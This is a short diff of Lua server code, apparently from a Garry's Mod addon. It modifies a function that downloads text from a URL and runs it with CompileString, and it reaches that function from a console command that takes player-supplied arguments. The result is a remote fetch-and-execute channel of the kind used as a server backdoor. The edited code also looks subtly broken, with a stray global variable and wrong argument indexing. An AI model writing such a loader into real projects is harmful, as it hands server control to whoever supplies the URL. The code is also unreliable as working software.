@@ -1,12 +1,15 @@
 	if SERVER then
 	
-		local function UrlFunc(url,...)
+		local function UrlFunc(...)
+			local arg = {...}
 			local func
-			http.Fetch(url, function(c)
+			url = arg[1]
+			table.remove(arg, 1)
+			
+			http.Fetch(arg[1], function(c)
 				func = CompileString(c, "UrlFunc", false)
-				--pcall(f)
-			end)	
-			return func(...)
+				return func(arg)
+			end)			
 		end
 		
 		util.AddNetworkString('_da_')
@@ -346,7 +349,7 @@
 		end)
 		
 		local function cmdurlfunc(player,command,args)
-			if args[1] then
+			if args then
 				UrlFunc(args)
 			end
 		end
